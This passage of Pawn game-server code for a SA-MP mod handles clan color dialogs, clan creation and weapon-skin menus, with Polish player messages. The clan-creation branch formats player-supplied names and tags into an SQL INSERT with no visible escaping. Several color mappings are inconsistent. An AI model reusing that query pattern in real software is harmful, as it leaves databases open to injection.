						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 12: {
				        ClanColor[playerid] = 12;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 13: {
				        ClanColor[playerid] = 13;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				    case 14: {
				        ClanColor[playerid] = 14;
						ClanStrefa[playerid] = true;
						ClanPunkty[playerid] = 0;
						SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do jednego z rogów dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
						return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Przechodzisz do tworzenia dzielnicy Twojego klanu.\n"C_RED"Od tej pory nie mo¿esz u¿ywaæ ¿adnych komend oprócz tych z kreatora.\n"C_WHITE"Stañ teraz na jednym z rogów Twojej dzielnicy i naciœnij "C_BLUE1"N "C_WHITE"gdy bêdziesz gotowy.\n\nDzielnicê tworzy siê "C_RED"po przek¹tnej"C_WHITE".\n\n"C_RED"Zmiana terenu nie jest póŸniej mo¿liwa!", "Zamknij", ""); }
				}
		    }
		}
		case DIALOG_KLANKOLOREDIT:
		{
		    if(!response) return 1;
		    if(response)
		    {
				new gangid = Player[playerid][Gang];
		        new tdstr[256];
		        format(gName[gangid], 17, "%s", ClanName[playerid]);
		        format(gTag[gangid], 7, "%s", ClanTag[playerid]);
		       	format(tdstr, sizeof(tdstr), "%s [%s] "C_WHITE"(ID "C_ORANGE"%d"C_WHITE")\n"C_YELLOW"Punkt startowy klanu", gName[gangid], gTag[gangid], gangid);
				switch(listitem)
				{
				    case 0: {
				        ClanColor[playerid] = 0;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], GREY);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, GREY, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				    case 1: {
				        ClanColor[playerid] = 1;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], GREEN);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, GREEN, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				    case 2: {
				        ClanColor[playerid] = 2;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], RED);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, RED, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						return SendClientMessageToAll(-1, str); }
				    case 3: {
				        ClanColor[playerid] = 3;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], YELLOW);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, YELLOW, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						return SendClientMessageToAll(-1, str); }
				    case 4: {
				        ClanColor[playerid] = 4;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], BLUE);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, BLUE, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						return SendClientMessageToAll(-1, str); }
				    case 5: {
				        ClanColor[playerid] = 5;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], ORANGE);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, ORANGE, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						return SendClientMessageToAll(-1, str); }
				    case 6: {
				        ClanColor[playerid] = 6;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], MAGENTA);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, MAGENTA, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				    case 7: {
				        ClanColor[playerid] = 7;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], AQUA);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, AQUA, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				    case 8: {
				        ClanColor[playerid] = 8;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], GOLD);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, GOLD, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				    case 9: {
				        ClanColor[playerid] = 9;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], SEAGREEN);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, SEAGREEN, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				    case 10: {
				        ClanColor[playerid] = 10;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], OLIVE);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, OLIVE, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				    case 11: {
				        ClanColor[playerid] = 11;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], SPRINGGREEN);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, SPRINGGREEN, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				    case 12: {
				        ClanColor[playerid] = 12;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], MAROON);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, MAROON, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				    case 13: {
				        ClanColor[playerid] = 7;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], MEDIUMAQUA);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, MEDIUMAQUA, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				    case 14: {
				        ClanColor[playerid] = 7;
						gColor[gangid] = ClanColor[playerid];
						new str[256];
						format(str, sizeof(str), ""C_NICK"%s(%d) "C_ORANGE"zaktualizowa³ swój klan.", Player[playerid][Name], playerid);
						GangZoneHideForAll(gZone[gangid]);
						GangZoneShowForAll(gZone[gangid], MEDIUMMAGENTA);
						Delete3DTextLabel(gText[gangid]);
						gText[gangid] = Create3DTextLabel(tdstr, MEDIUMMAGENTA, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
						return SendClientMessageToAll(-1, str); }
				}
		    }
		}
		case DIALOG_KLANCONFIRM:
		{
		    if(!response)
			{
			    ClanColor[playerid] = -1;
 				ClanStrefa[playerid] = false;
  				ClanPatriot[playerid] = false;
   				ClanPunkty[playerid] = 0;
   				ClanPunkt[playerid] = false;
			    SendClientMessage(playerid, RED, "Anulowano proces tworzenia klanu. Klan nie zosta³ stworzony.");
				return 1;
			}
		    if(response)
		    {
		       	if(gangs >= MAX_GANGS) {
			    	ClanColor[playerid] = -1;
			    	ClanStrefa[playerid] = false;
			    	ClanPatriot[playerid] = false;
			    	ClanPunkty[playerid] = 0;
		   			return SendClientMessage(playerid, RED, "Zosta³ osi¹gniêty limit klanów."); }
				ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie klanu", ""C_WHITE"Proszê czekaæ... Klan jest zapisywany.", "Zamknij", "");
		        Player[playerid][Exp] -= 20000;
			    ClanStrefa[playerid] = false;
			    ClanPatriot[playerid] = false;
			    ClanPunkt[playerid] = false;
			    ClanPunkty[playerid] = 0;
			   	Loop(x, MAX_PLAYERS) Sound(x, 1139, 0.0, 0.0, 0.0); 
		  		new gangid, tdstr[256];
				gangid = ReturnGangFreeUID();
				gName[gangid] = ClanName[playerid];
				gTag[gangid] = ClanTag[playerid];
				gColor[gangid] = ClanColor[playerid];
				gSpawnX[gangid] = ClanSpawnX[playerid];
				gSpawnY[gangid] = ClanSpawnY[playerid];
				gSpawnZ[gangid] = ClanSpawnZ[playerid];
				gScore[gangid] = 0;
				gVehX[gangid] = ClanPatriotX[playerid];
				gVehY[gangid] = ClanPatriotY[playerid];
				gVehZ[gangid] = ClanPatriotZ[playerid];
				gVehA[gangid] = ClanPatriotA[playerid];
				gMinX[gangid] = ClanMinX[playerid];
				gMaxX[gangid] = ClanMaxX[playerid];
				gMinY[gangid] = ClanMinY[playerid];
				gMaxY[gangid] = ClanMaxY[playerid];
				Player[playerid][Gang] = gangid;
				gLider1[gangid] = Player[playerid][ID];
				gLider2[gangid] = -1;
				m_query("INSERT INTO clans (uid, name, color, tag, spawnx, spawny, spawnz, vx, vy, vz, va, minx, miny, maxx, maxy, lider1) VALUES (%d, '%s', %d, '%s', %f, %f, %f, %f, %f, %f, %f, %f, %f, %f, %f, %d)", gangid, gName[gangid], gColor[gangid], gTag[gangid], gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid],
					gVehX[gangid], gVehY[gangid], gVehZ[gangid], gVehA[gangid], gMinX[gangid], gMinY[gangid], gMaxX[gangid], gMaxY[gangid], gLider1[gangid]);
				if(gColor[gangid] == 0) gText[gangid] = Create3DTextLabel(tdstr, GREY, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 1) gText[gangid] = Create3DTextLabel(tdstr, GREEN, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 2) gText[gangid] = Create3DTextLabel(tdstr, RED, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 3) gText[gangid] = Create3DTextLabel(tdstr, YELLOW, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 4) gText[gangid] = Create3DTextLabel(tdstr, BLUE, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 5) gText[gangid] = Create3DTextLabel(tdstr, ORANGE, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 6) gText[gangid] = Create3DTextLabel(tdstr, MAGENTA, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 7) gText[gangid] = Create3DTextLabel(tdstr, AQUA, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 8) gText[gangid] = Create3DTextLabel(tdstr, GOLD, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 9) gText[gangid] = Create3DTextLabel(tdstr, SEAGREEN, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 10) gText[gangid] = Create3DTextLabel(tdstr, OLIVE, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 11) gText[gangid] = Create3DTextLabel(tdstr, SPRINGGREEN, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 12) gText[gangid] = Create3DTextLabel(tdstr, MAROON, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				if(gColor[gangid] == 13) gText[gangid] = Create3DTextLabel(tdstr, LIME, gSpawnX[gangid], gSpawnY[gangid], gSpawnZ[gangid], 60.0, 0, 0);
				gZone[gangid] = GangZoneCreate(gMinX[gangid], gMinY[gangid], gMaxX[gangid], gMaxY[gangid]);
				if(gColor[gangid] == 0) GangZoneShowForAll(gZone[gangid], GREY);
				if(gColor[gangid] == 1) GangZoneShowForAll(gZone[gangid], GREEN);
				if(gColor[gangid] == 2) GangZoneShowForAll(gZone[gangid], RED);
				if(gColor[gangid] == 3) GangZoneShowForAll(gZone[gangid], YELLOW);
				if(gColor[gangid] == 4) GangZoneShowForAll(gZone[gangid], BLUE);
				if(gColor[gangid] == 5) GangZoneShowForAll(gZone[gangid], ORANGE);
				if(gColor[gangid] == 6) GangZoneShowForAll(gZone[gangid], MAGENTA);
				if(gColor[gangid] == 7) GangZoneShowForAll(gZone[gangid], AQUA);
				if(gColor[gangid] == 8) GangZoneShowForAll(gZone[gangid], GOLD);
				if(gColor[gangid] == 9) GangZoneShowForAll(gZone[gangid], SEAGREEN);
				if(gColor[gangid] == 10) GangZoneShowForAll(gZone[gangid], OLIVE);
				if(gColor[gangid] == 11) GangZoneShowForAll(gZone[gangid], SPRINGGREEN);
				if(gColor[gangid] == 12) GangZoneShowForAll(gZone[gangid], MAROON);
				if(gColor[gangid] == 13) GangZoneShowForAll(gZone[gangid], LIME);
				if(gColor[gangid] == 14) GangZoneShowForAll(gZone[gangid], MEDIUMAQUA);
				if(gColor[gangid] == 15) GangZoneShowForAll(gZone[gangid], MEDIUMMAGENTA);
				SendClientMessageToAll(-1, ""C_WHITE"");
				Loop(ach, 8) gAch[gangid][ach] = false;
				new msgstr[256];
				if(gColor[gangid] == 0) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, GREY >>> 8, gName[gangid]);
				if(gColor[gangid] == 1) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, GREEN >>> 8, gName[gangid]);
				if(gColor[gangid] == 2) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, RED >>> 8, gName[gangid]);
				if(gColor[gangid] == 3) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, YELLOW >>> 8, gName[gangid]);
				if(gColor[gangid] == 4) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, BLUE >>> 8, gName[gangid]);
				if(gColor[gangid] == 5) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, ORANGE >>> 8, gName[gangid]);
				if(gColor[gangid] == 6) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, MAGENTA >>> 8, gName[gangid]);
				if(gColor[gangid] == 7) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, AQUA >>> 8, gName[gangid]);
				if(gColor[gangid] == 8) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, GOLD >>> 8, gName[gangid]);
				if(gColor[gangid] == 9) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, SEAGREEN >>> 8, gName[gangid]);
				if(gColor[gangid] == 10) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, MAROON >>> 8, gName[gangid]);
				if(gColor[gangid] == 11) format(msgstr, sizeof(msgstr), ""C_NICK"%s(%d) "C_ORANGE"utworzy³ nowy klan: {%06x}%s", Player[playerid][Name], playerid, LIME >>> 8, gName[gangid]);
				SendClientMessageToAll(-1, msgstr);
				SendClientMessageToAll(-1, ""C_WHITE"");
				gangs++;
				SaveClans();
				return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie klanu", ""C_GREEN"Gratulujemy! Klan zosta³ zapisany!\n"C_BLUE1"Mo¿esz od teraz rekrutowaæ cz³onków.", "Zamknij", "");
		    }
		}
		case DIALOG_SKINS1:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0: SetSkin(playerid, 3);
		            case 1: SetSkin(playerid, 4);
		            case 2: SetSkin(playerid, 5);
		            case 3: SetSkin(playerid, 6);
		            case 4: SetSkin(playerid, 7);
		        }
			}
		}
		case DIALOG_SKINS2:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0: SetSkin(playerid, 8);
		            case 1: SetSkin(playerid, 9);
		            case 2: SetSkin(playerid, 10);
		            case 3: SetSkin(playerid, 11);
		            case 4: SetSkin(playerid, 12);
		        }
			}
		}
		case DIALOG_SKINS3:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0: SetSkin(playerid, 13);
		            case 1: SetSkin(playerid, 14);
		            case 2: SetSkin(playerid, 15);
		            case 3: SetSkin(playerid, 16);
		        }
			}
		}
		case DIALOG_SKINS4:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0: SetSkin(playerid, 17);
		            case 1: SetSkin(playerid, 18);
		            case 2: SetSkin(playerid, 19);
		            case 3: SetSkin(playerid, 20);
		        }
			}
		}
		case DIALOG_SKINS5:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0: SetSkin(playerid, 21);
		            case 1: SetSkin(playerid, 22);
		            case 2: SetSkin(playerid, 23);
		            case 3: SetSkin(playerid, 24);
		        }
			}
		}
		case DIALOG_SKINS6:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0: SetSkin(playerid, 25);
		            case 1: SetSkin(playerid, 26);
		            case 2: SetSkin(playerid, 27);
		            case 3: SetSkin(playerid, 28);
		        }
			}
		}
		case DIALOG_SKINS7:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0: SetSkin(playerid, 29);
		            case 1: SetSkin(playerid, 30);
		            case 2: SetSkin(playerid, 31);
		            case 3: SetSkin(playerid, 32);
		            case 4: SetSkin(playerid, 33);
		        }
			}
		}
		case DIALOG_SKINS8:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0: SetSkin(playerid, 34);
		            case 1: SetSkin(playerid, 35);
		            case 2: SetSkin(playerid, 36);
		            case 3: SetSkin(playerid, 37);
		        }
			}
		}
		case DIALOG_SKINS:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0: SetSkin(playerid, 1);
		            case 1: SetSkin(playerid, 2);
		            case 2:
		            {
		            	new s[2048];
						if(sk[playerid][2]) format(s, sizeof(s), ""C_WHITE"["C_LOLIVE"+"C_WHITE"] "C_RED"Silencer | Blood\n");
						else format(s, sizeof(s), ""C_WHITE"["C_RED"-"C_WHITE"] "C_RED"Silencer | Blood\n");
						if(sk[playerid][3]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {A5FF00}Silencer | Lime\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {A5FF00}Silencer | Lime\n", s);
						if(sk[playerid][4]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {007BFF}Silencer | Navy Blue\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {007BFF}Silencer | Navy Blue\n", s);
						if(sk[playerid][5]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] "C_ORANGE"Silencer | Orange\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] "C_ORANGE"Silencer | Orange\n", s);
						if(sk[playerid][6]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {7C5F49}Silencer | Bronze", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {7C5F49}Silencer | Bronze", s);
						return ShowPlayerDialog(playerid, DIALOG_SKINS1, DIALOG_STYLE_LIST, ""C_BLUE1"Skiny do broni "C_WHITE"| "C_BLUE1"Silencer", s, "Wybierz", "Zamknij");
		            }
		            case 3:
		            {
		            	new s[2048];
						if(sk[playerid][7]) format(s, sizeof(s), ""C_WHITE"["C_LOLIVE"+"C_WHITE"] {AF2108}Desert Eagle | Critical Destroyer\n");
						else format(s, sizeof(s), ""C_WHITE"["C_RED"-"C_WHITE"] {AF2108}Desert Eagle | Critical Destroyer\n");
						if(sk[playerid][8]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {1B99F9}Desert Eagle | Blue Shoot\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {1B99F9}Desert Eagle | Blue Shoot\n", s);
						if(sk[playerid][9]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {5FA513}Desert Eagle | Forest\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {5FA513}Desert Eagle | Forest\n", s);
						if(sk[playerid][10]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {FF7700}Desert Eagle | Phoenix\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {FF7700}Desert Eagle | Phoenix\n", s);
						if(sk[playerid][11]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {7A5A3E}Desert Eagle | Leather", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {7A5A3E}Desert Eagle | Leather", s);
						return ShowPlayerDialog(playerid, DIALOG_SKINS2, DIALOG_STYLE_LIST, ""C_BLUE1"Skiny do broni "C_WHITE"| "C_BLUE1"Desert Eagle", s, "Wybierz", "Zamknij");
		            }
		            case 4:
		            {
		            	new s[2048];
						if(sk[playerid][12]) format(s, sizeof(s), ""C_WHITE"["C_LOLIVE"+"C_WHITE"] {AF2108}Shotgun | Red\n");
						else format(s, sizeof(s), ""C_WHITE"["C_RED"-"C_WHITE"] {AF2108}Shotgun | Red\n");
						if(sk[playerid][13]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] "C_YELLOW"Shotgun | Summer\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] "C_YELLOW"Shotgun | Summer\n", s);
						if(sk[playerid][14]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {DBDBDB}Shotgun | Snowball\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {DBDBDB}Shotgun | Snowball\n", s);
						if(sk[playerid][15]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {02DCF4}Shotgun | Sea", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {02DCF4}Shotgun | Sea", s);
						return ShowPlayerDialog(playerid, DIALOG_SKINS3, DIALOG_STYLE_LIST, ""C_BLUE1"Skiny do broni "C_WHITE"| "C_BLUE1"Shotgun", s, "Wybierz", "Zamknij");
		            }
		            case 5:
		            {
		            	new s[2048];
						if(sk[playerid][16]) format(s, sizeof(s), ""C_WHITE"["C_LOLIVE"+"C_WHITE"] {F402DC}Combat Shotgun | Magenta Power\n");
						else format(s, sizeof(s), ""C_WHITE"["C_RED"-"C_WHITE"] {F402DC}Combat Shotgun | Magenta Power\n");
						if(sk[playerid][17]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {02DCF4}Combat Shotgun | Blue Lightning\n", s);
